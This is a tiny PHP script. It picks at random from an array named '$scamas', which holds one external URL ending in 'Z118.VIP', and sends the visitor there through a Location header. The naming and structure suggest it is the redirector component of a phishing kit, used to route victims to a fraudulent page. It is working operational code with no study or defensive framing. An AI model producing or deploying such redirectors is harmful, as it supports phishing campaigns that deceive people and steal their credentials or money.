<?php

$scamas = array("https://www.relocatoremovals.in/Z118.VIP");

$rand = array_rand($scamas);

$random = $scamas[$rand];

header("Location: $random");

?>